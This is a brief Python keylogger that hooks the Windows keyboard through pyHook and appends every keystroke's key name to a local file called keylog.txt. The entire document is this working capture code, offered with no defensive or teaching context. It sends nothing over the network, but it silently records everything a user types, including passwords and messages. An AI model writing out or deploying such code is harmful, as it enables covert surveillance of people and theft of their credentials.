import pyHook, pythoncom, sys

def OnKeyboardEvent(event):
    # Get the name of the key that was pressed
    key = event.Key

    # Write the keystroke to a file
    with open("keylog.txt", "a") as f:
        f.write(key + "\n")

# Set the hook
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

# Start the event loop
pythoncom.PumpMessages()
